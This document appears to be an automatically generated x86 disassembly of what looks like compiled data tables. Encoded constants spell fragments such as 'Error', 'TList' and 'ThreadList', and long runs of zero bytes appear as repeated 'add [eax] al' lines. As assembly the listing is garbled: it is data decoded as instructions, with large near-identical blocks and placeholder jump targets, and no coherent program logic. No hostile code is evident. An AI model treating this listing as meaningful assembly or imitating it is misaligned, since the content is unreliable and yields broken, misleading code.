add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ebx ] cl
inc ebp
inc esi
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
xor [ edx ] 0x40
sbb al 0x4f
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 2 ] bl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
and [ esi + 0x41 ] cl
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ebx ] cl
inc ebp
push edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
dec esi
inc ecx
dec esi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 2 + 0xc0041 ] al
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
xor al [ eax ]
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
push eax
inc ecx
add [ eax + eax ] cl
add [ eax ] al
pop eax
jb r-xdata
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
pushfd
xor al [ eax ]
fdiv [ edx ]
test [ eax + 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ edx ] cl
inc ebp
dec esp
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
fdiv [ edx ]
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x50
add [ eax + eax ] cl
add [ eax ] al
pop eax
jb r-xdata
nop
ror [ edi + 0x41 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax + eax ] cl
add [ eax ] al
pop eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 2 ] ch
inc eax
add [ eax * 2 + 0x4e736552 ] cl
outsd
je r-xdata
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 2 ] bh
inc ecx
add [ eax + eax ] cl
add [ eax ] al
pop eax
jb r-xdata
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ eax ] dl
inc ebp
push ebx
je r-xdata
add [ eax ] al
pop eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ eax + 0x41 ] dl
add [ eax + eax ] cl
lea eax [ eax ]
sub al 0x50
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ edi + 0x41 ] 0x1
outsd
jb r-xdata
add [ eax ] al
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ edi ] cl
inc ebp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
dec edi
inc ecx
dec edi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
push dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004151 ] bl
add [ eax ] al
add [ ebx + esi * 2 ] bl
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ ecx + edi * 4 + 0x32d80040 ] ch
outsd
cmp al 0x35
add [ eax + 0x74 ] cl
inc ecx
add ah al
je r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor [ 0x353c0040 ] dh
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x73f40040 ] bl
inc ecx
add [ eax - 0x7fffbe8b ] bl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edx
inc ecx
jne r-xdata
inc eax
add [ edi ] cl
inc ebp
dec edi
jne r-xdata
xor al [ eax ]
lodsb [ esi ]
mov ecx 0x32d80040
jb r-xdata
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ edx ] cl
inc ebp
inc edx
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
fcom [ eax + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ecx + edx * 2 ] bh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x77d80040 ] bl
inc ecx
shl [ ebx + edx * 2 + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
push ebx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x53 ] dh
inc ecx
add [ esi + 0x53 ] bh
inc ecx
add [ eax + eax ] al
add [ eax ] al
and [ ecx ] dl
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x7ae80040 ] bl
inc ecx
add al bh
jpo r-xdata
add [ ebx ] cl
push esp
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebx + 0x41 ] dl
add [ eax + eax ] cl
add [ eax ] al
and [ ecx ] dl
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x794c0040 ] bl
inc ecx
add [ 0x74694254 ] al
jae r-xdata
inc esp
xor eax 0x35380040
inc eax
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
fdiv [ edi + 0x41 ]
add [ 0x73694c54 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx * 2 + 0x41 ] ah
arpl [ ebp + 0x73 ] sp
hlt
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
outsd
jb r-xdata
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
jl r-xdata
dec ecx
outsb
jbe r-xdata
inc eax
add [ eax + 0x35 ] al
sar [ eax + 0x4152 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x24004152
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor [ 0x353c0040 ] dh
jb r-xdata
imul esi [ ebx + 0x74 ] 0x6f727245
push ecx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
jae r-xdata
jae r-xdata
add [ ebx + edi * 2 ] dl
inc ecx
add [ edx ] al
add bh bh
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0x5254c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sbb [ ebx + 0x41 ] dl
add [ eax ] dh
xor eax 0x7cb80040
inc ecx
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x7ae80040 ] bl
inc ecx
add al bh
jpo r-xdata
add [ ebp - 0x7c33ffc0 ] cl
inc esp
and al 0x4
clc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
add [ esp + edx * 2 + 0x41 ] ah
add [ eax + 0x4154 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x54 ] dh
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebx + 0x74 ] 0x90746e65
push esp
inc ecx
add [ edi ] al
adc eax 0x746e4954
jb r-xdata
popa
add [ eax ] al
jl r-xdata
and al 0x2b
add [ eax ] dh
add [ ecx ] 0x28
jg r-xdata
add al al
push ebp
inc ecx
add al ah
push ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
push ebp
inc ecx
arpl [ ebp + 0x64 ] sp
push eax
popad
add [ eax ] dl
add [ eax ] al
add [ eax ] bl
push ebx
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
rcl [ ebp + 0x41 ] cl
imul esi [ ebx + 0x74 ] 0x54746e65
push esp
inc ecx
add [ ebx + edx * 2 + 0x41 ] cl
pop es
inc ebx
insb
popad
jae r-xdata
jb r-xdata
push eax
add [ ebx + edi * 2 ] dl
inc ecx
add [ eax + 0x7d ] cl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx + 0x40040 ] dl
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
add [ eax ] al
add [ eax ] cl
push edi
inc ecx
add [ eax ] dh
outsb
jae r-xdata
int3
add [ ebx + ebp ] ah
inc eax
add [ edx + eax * 4 + 0x2b240041 ] dh
inc eax
add [ edx + eax * 4 - 0x7cebffbf ] bh
inc ecx
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x7df80040 ] bl
inc ecx
add al bh
jpo r-xdata
jae r-xdata
sbb dl 0x7
inc ebx
insb
popad
jae r-xdata
cwde
lea eax [ ecx ]
fmul [ ebp - 0x71bbffbf ]
inc ecx
add al al
add [ ecx ] 0xd4
pop [ ecx ]
push esp
test [ ecx ] eax
sub [ esi - 0x6fefffbf ] al
inc ecx
add [ eax ] ah
nop
add [ eax ] dh
pushad
mov al [ ecx ]
and [ ebx - 0x73abffbf ] cl
inc ecx
add [ eax ] ch
jle r-xdata
loopne r-xdata
adc [ edx + 0xe0041 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
mov esp 0xc004154
add [ eax ] al
add [ eax ] cl
push esp
push ebx
je r-xdata
inc eax
add [ ebx + ebp ] ah
inc eax
add ah cl
add [ ecx ] sub_4182c0
enter 0x4184 0x0
push esp
test [ ecx ] eax
sub [ esi + 0x2b240041 ] al
inc eax
add [ esi + eax * 4 + 0x41 ] bl
add [ esi + eax * 4 - 0x791fffbf ] cl
inc ecx
add [ edi + eax * 4 - 0x76dbffbf ] cl
inc ecx
add [ ecx + ecx * 4 + 0x41 ] bh
add [ eax ] dl
mov al [ ecx ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esp + edx * 2 + 0xc0041 ] bh
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
add [ esi + edi * 2 + 0x41 ] cl
add [ eax + 0x7e ] dh
inc ecx
add [ ebx + ebp ] ah
add [ eax + r-xdata ] dl
add [ eax + ecx * 4 ] bh
inc ecx
add [ eax - 0x78 ] dh
inc ecx
add al bl
mov [ ecx ] eax
jae r-xdata
add [ edi + ecx * 4 + 0x41 ] dh
add [ eax - 0x71 ] bh
inc ecx
add [ ebx + eax * 4 ] dl
inc ecx
add ah ch
nop
inc ecx
add [ eax - 0x6f ] cl
inc ecx
add [ edx + edx * 4 ] bl
inc ecx
add [ eax - 0x76 ] ah
inc ecx
add [ eax - 0x6e ] bl
inc ecx
add ah cl
xchg edx eax
inc ecx
add al dh
mov [ ecx ] es
cld
mov [ ecx ] es
jo r-xdata
inc ecx
add [ eax + edx * 4 + 0x41 ] dh
add ah al
mov es [ ecx ]
test [ edx - 0x6d6bffbf ] dl
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
inc ecx
add [ esi + eax * 4 - 0x791fffbf ] cl
inc ecx
add [ edi + eax * 4 - 0x76dbffbf ] cl
inc ecx
add [ ecx + ecx * 4 + 0x41 ] bh
add [ eax ] dl
mov al [ ecx ]
pushad
lea eax [ ecx ]
jl r-xdata
inc esp
mov es [ ecx ]
rol [ edx - 0x702bffbf ] 0x41
add [ ebp + eax * 4 + 0x41 ] dl
add [ eax ] ch
xchg [ ecx ] al
adc [ eax - 0x6fdfffbf ] dl
add [ edi + ecx * 4 ] bh
inc ecx
add [ eax - 0x71 ] dh
inc ecx
add [ eax ] bl
push edi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ edi ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
add [ eax ] al
add ah dh
push esp
inc ecx
add [ eax ] dh
xor eax 0x353c0040
imul ebp [ esi + 0x67 ] 0x55e09073
dec [ ebx + 0x415540c0 ]
add [ eax ] al
add bh bh
inc ebx
insb
popad
jae r-xdata
inc ecx
add [ eax - 0x27ffbe73 ] bl
lea eax [ ecx ]
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ebx + edx * 4 ] bl
imul ebp [ esi + 0x67 ] 0x7473694c
sbb [ edi + 0x41 ] dl
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x736bffc0 ] bl
inc ecx
add al bh
xor [ 0x353c0040 ] dh
outsb
jae r-xdata
jb r-xdata
jae r-xdata
push ebx
je r-xdata
popad
inc ecx
add [ eax - 0x6d ] ch
inc ecx
add [ eax + 0x24004193 ] al
sub eax [ eax ]
and al 0x2b
inc eax
add [ eax ] ah
xchg esp eax
inc ecx
add [ esp + edx * 4 + 0x54070041 ] ah
push ebx
je r-xdata
sbb al 0x93
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
fcom [ ebp + 0x41 ]
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
inc ecx
add [ ebx + edx * 2 + 0x41 ] cl
pop es
inc ebx
insb
popad
jae r-xdata
add [ edi + edx * 4 ] dh
inc ecx
add [ 0x6e614854 ] cl
insb
insd
clc
push edi
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 ] dl
inc ecx
add [ eax ] cl
add [ eax ] al
add [ edi + edx * 2 ] bh
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ebx + edx * 4 ] bl
inc ecx
add [ eax - 0x69 ] ah
inc ecx
add [ edi + edx * 4 + 0x41 ] dh
add [ edi + edx * 4 ] dl
inc ecx
add [ edi + edx * 4 ] ah
inc ecx
add [ eax ] ah
xchg esp eax
inc ecx
popad
add [ ebp + 0x57880040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 2 + 0x40041 ] ah
add [ eax ] al
and [ ecx ] dl
inc eax
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
push ebx
je r-xdata
popad
insd
mov eax eax
jo r-xdata
jpo r-xdata
mov [ ecx ] es
clc
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
in al 0x58
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ecx
inc ecx
add [ eax ] dl
add [ eax ] al
add [ edi + edx * 2 ] bh
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ebx + edx * 4 ] bl
inc ecx
add [ eax - 0x6d ] ch
inc ecx
add [ eax + 0x70004193 ] al
cdq
inc ecx
add [ ebx + ebp ] ah
inc eax
add [ eax - 0x5bffbe67 ] ch
xchg esp eax
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
inc ecx
add [ edi + edx * 4 ] ah
inc ecx
add [ eax ] ah
xchg esp eax
inc ecx
add [ edi + edx * 4 ] dh
inc ecx
add [ ebx ] cl
push esp
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 + 0x80041 ] cl
add [ eax ] al
lodsb [ esi ]
push edi
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x66cbffc0 ] bl
inc ecx
add [ ebx + edx * 4 ] bl
inc ecx
add [ eax - 0x69 ] ah
inc ecx
add [ edi + edx * 4 + 0x41 ] dh
add [ edi + edx * 4 ] dl
add [ ebx + 0x415604c0 ] cl
add [ esi ] cl
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
jns r-xdata
push ebx
je r-xdata
movsb [ edi ] [ esi ]
je r-xdata
xor [ eax + 0x7f280041 ] al
inc ecx
outsb
dec ecx
je r-xdata
sbb al 0x93
je r-xdata
insd
xchg esp eax
inc ecx
add [ edx + ebx * 4 + 0x540d0041 ] bl
dec ebp
popad
insd
pushad
pop ecx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x14004159 ] al
add [ eax ] al
add [ eax + 0x30004158 ] bl
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x6633ffc0 ] bl
inc ecx
add [ ebx + edx * 4 ] bl
inc ecx
add [ eax - 0x66 ] dh
inc ecx
add [ eax + 0x70004193 ] al
cdq
inc ecx
add [ eax ] ch
fwait
inc ecx
add [ eax - 0x5bffbe67 ] ch
push ebx
push ebx
outsd
jb r-xdata
inc ecx
add [ esp + edx * 4 - 0x6563ffbf ] ah
inc ecx
add [ 0x6d654d54 ] cl
add [ ecx ] 0x28
jg r-xdata
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
in al 0x10
inc eax
add [ eax ] al
add [ eax ] al
add [ ebp + 0x56700040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
outsd
inc ecx
add [ eax - 0x6d ] ch
inc ecx
add [ eax + 0x70004193 ] al
cdq
inc ecx
add [ ebx * 4 - 0x6657ffbf ] dh
inc ecx
add [ esp + edx * 4 + 0x540f0041 ] ah
push edx
jae r-xdata
popad
insd
mov eax eax
fcomp [ ecx + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
pop ecx
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x30004158 ] bl
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x6303ffc0 ] bl
inc ecx
add [ ebx + edx * 4 ] bl
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
je r-xdata
arpl [ ebp + 0x53 ] sp
sub_415375
push [ esp + edi * 2 + 0x7c040041 ]
inc ecx
add [ ebx ] cl
push esp
push eax
jb r-xdata
add [ esi - 0x27 ] al
push ebx
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x54540040 ] cl
imul esi [ ebx + 0x74 ] 0x8b746e65
rcl [ eax + 0x7004153 ] 0xb
push esp
push eax
jb r-xdata
popa
add [ eax ] al
jl r-xdata
inc ecx
add ch ah
push ebx
inc ecx
add [ eax ] al
add [ eax ] al
add [ esp + edx * 2 + 0x41 ] ah
add [ eax + 0x4154 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x54 ] dh
imul esi [ ebx + 0x74 ] 0x64746e65
push ebx
inc ecx
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
rcl [ ebp + 0x41 ] cl
imul esi [ ebx + 0x74 ] 0x54746e65
push esp
inc ecx
add [ ebx + edx * 2 + 0x41 ] cl
pop es
inc ebx
insb
popad
jae r-xdata
jb r-xdata
push eax
add [ ebx + edi * 2 ] dl
inc ecx
add [ eax + 0x7d ] cl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx + 0x40040 ] dl
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jbe r-xdata
jae r-xdata
and al 0x2b
add [ eax ] dh
add [ ecx ] 0x28
jg r-xdata
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x7df80040 ] bl
inc ecx
add al bh
jpo r-xdata
jae r-xdata
sbb dl 0x7
inc ebx
insb
popad
jae r-xdata
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
sbb [ ebx + 0x41 ] dl
add [ eax ] dh
xor eax 0x7cb80040
inc ecx
add [ eax + 0x35 ] al
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x7ae80040 ] bl
inc ecx
add al bh
jpo r-xdata
add [ ebp - 0x7c33ffc0 ] cl
inc esp
and al 0x4
clc
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xc ]
add [ eax ] al
add [ eax ] cl
push edi
inc ecx
add [ eax ] dh
outsb
jae r-xdata
int3
add [ ebx + ebp ] ah
inc eax
add [ edx + eax * 4 + 0x2b240041 ] dh
inc eax
add [ edx + eax * 4 - 0x7cebffbf ] bh
inc ecx
add [ eax + r-xdata ] dl
add [ eax + ecx * 4 ] bh
inc ecx
add [ eax - 0x78 ] dh
inc ecx
add al bl
mov [ ecx ] eax
jae r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax ] bl
push ebx
inc ecx
add [ eax ] dh
xor eax 0x353c0040
inc eax
add [ eax + 0x35 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebx + 0x74 ] 0x90746e65
push esp
inc ecx
add [ edi ] al
adc eax 0x746e4954
jb r-xdata
cwde
lea eax [ ecx ]
fmul [ ebp - 0x71bbffbf ]
inc ecx
add al al
add [ ecx ] 0xd4
pop [ ecx ]
push esp
test [ ecx ] eax
sub [ esi - 0x6fefffbf ] al
inc ecx
add [ eax ] ah
nop
add [ eax ] dh
pushad
mov al [ ecx ]
and [ ebx - 0x73abffbf ] cl
inc ecx
add [ eax ] ch
jle r-xdata
loopne r-xdata
adc [ edx + 0xe0041 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
mov esp 0xc004154
add [ eax ] al
add [ eax ] cl
push esp
push ebx
je r-xdata
inc eax
add [ ebx + ebp ] ah
inc eax
add ah cl
add [ ecx ] sub_4182c0
enter 0x4184 0x0
push esp
test [ ecx ] eax
sub [ esi + 0x2b240041 ] al
inc eax
add [ esi + eax * 4 + 0x41 ] bl
add [ esi + eax * 4 - 0x791fffbf ] cl
inc ecx
add [ edi + eax * 4 - 0x76dbffbf ] cl
inc ecx
add [ ecx + ecx * 4 + 0x41 ] bh
add [ eax ] dl
mov al [ ecx ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esp + edx * 2 + 0xc0041 ] bh
add [ eax ] al
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
add [ esi + edi * 2 + 0x41 ] cl
add [ eax + 0x7e ] dh
inc ecx
add [ ebx + ebp ] ah
dec [ ebx + 0x415540c0 ]
add [ eax ] al
add bh bh
add al al
push ebp
inc ecx
add al ah
push ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
push ebp
inc ecx
arpl [ ebp + 0x64 ] sp
push eax
popad
add [ edi + ecx * 4 + 0x41 ] dh
add [ eax - 0x71 ] bh
inc ecx
add [ ebx + eax * 4 ] dl
inc ecx
add ah ch
nop
inc ecx
